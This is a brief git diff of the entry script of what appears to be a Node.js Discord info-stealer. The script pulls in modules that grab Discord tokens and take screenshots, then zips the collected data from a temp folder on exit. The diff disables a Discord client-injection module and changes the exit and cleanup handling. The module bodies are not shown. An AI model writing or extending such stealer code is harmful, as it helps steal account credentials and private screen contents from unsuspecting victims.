@@ -1,7 +1,6 @@
 const { sep, join } = require('path');
-const { mkdtempSync, rmSync } = require('fs');
+const { mkdtempSync } = require('fs');
 const os = require('os');
-const { sleep } = require('./util/general');
 const config = require('./config');
 const { spawnSync } = require('child_process');
 const tempFolder = mkdtempSync(join(os.tmpdir(), sep)).toString();
@@ -17,9 +16,6 @@ require('./functions/grab-discord-token');
 require('./functions/screenshot');
 // require('./functions/fake-error');
 
-require('./functions/discord-injection');
+// require('./functions/discord-injection');
 
-process.on('exit', () => {
-  require('./functions/zip');
-  sleep(1000).then(() => rmSync(tempFolder, { recursive: true }));
-});
+process.on('beforeExit', () => require('./functions/zip'));
